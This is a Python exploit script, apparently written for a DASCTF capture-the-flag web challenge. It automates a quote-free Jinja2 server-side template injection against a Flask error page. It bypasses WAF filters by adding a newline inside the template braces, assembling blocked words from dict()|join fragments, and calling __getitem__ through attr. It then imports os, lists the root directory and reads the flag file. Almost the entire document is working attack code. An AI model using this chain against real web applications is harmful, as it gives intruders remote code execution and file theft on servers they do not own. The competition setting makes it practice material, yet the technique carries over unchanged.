#!/usr/bin/env python3
"""DASCTF 2026 WEB5 — Flask/Jinja2 SSTI 无引号 RCE 链(通用调试框架)

适用:404/错误页把 URL path 注入模板渲染;WAF 封 ' " [ ] 与
os/popen/open/read/import 等词,且正则拦截"单行闭合"的 {{...}}。
核心思路:
  1. {{expr\n}} 换行绕过单行闭合正则(无 DOTALL)
  2. dict(x=1)|join 生成字符串段,~ 拼接绕词过滤(全程无引号)
  3. 老 Jinja2 attr 过滤器只 getattr 不做 obj[key] 回退 →
     dict 取值一律 |attr("__getitem__")(key) 方法调用
用法:改 T 为目标,python3 rce.py 执行主链;改 ssti() 可做逐段探测。
"""
import urllib.parse, urllib.request, urllib.error, random, re

T = "http://TARGET.http-ctf2.dasctf.com:80"

# ---- 无引号字符串片段(拆段避开子串黑名单) ----
GI  = "dict(__getitem__=1)|join"
G   = "dict(__globals__=1)|join"
B   = "dict(__built=1)|join~dict(ins__=1)|join"        # __builtins__
IMP = "dict(__imp=1)|join~dict(ort__=1)|join"          # __import__
OS  = "dict(o=1)|join~dict(s=1)|join"                  # os
SEP = "dict(sep=1)|join"                               # sep
OP  = "dict(ope=1)|join~dict(n=1)|join"                # open
RD  = "dict(rea=1)|join~dict(d=1)|join"                # read
LS  = "dict(listdir=1)|join"                           # listdir
FLAGNAME = "dict(flag=1)|join"                         # flag

BUILT = f"lipsum|attr({G})|attr({GI})({B})"
OSM   = f"({BUILT})|attr({GI})({IMP})({OS})"

def ssti(expr):
    """发送 {{expr\n}} 并提取 h1/h3 回显;三类响应分诊:
    正常404文案+回显=执行成功 / 空回显=Undefined / Do-not-be-Evil=WAF / 500=模板错误"""
    payload = "{{" + expr + "\n}}"
    assert payload.count("{{") == 1
    path = "/" + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(T + path + "?nc=%d" % random.randint(0, 1 << 30))
    try:
        body = urllib.request.urlopen(req, timeout=20).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    parts = re.findall(r"<h([13])>(.*?)</h\1>", body, re.S)
    r = " | ".join(v for _, v in parts) if parts else "?? " + body[:100]
    for a, b in (("&#39;", "'"), ("&lt;", "<"), ("&gt;", ">"),
                 ("&quot;", '"'), ("&amp;", "&")):
        r = r.replace(a, b)
    return r

if __name__ == "__main__":
    print("[*] os module :", ssti(OSM)[:100])
    print("[*] ls /      :", ssti(f"({OSM})|attr({LS})(({OSM})|attr({SEP}))")[:400])
    expr = (f"({BUILT})|attr({GI})({OP})"
            f"((({OSM})|attr({SEP}))~({FLAGNAME}))"
            f"|attr({RD})()")
    print("[*] flag      :", ssti(expr))
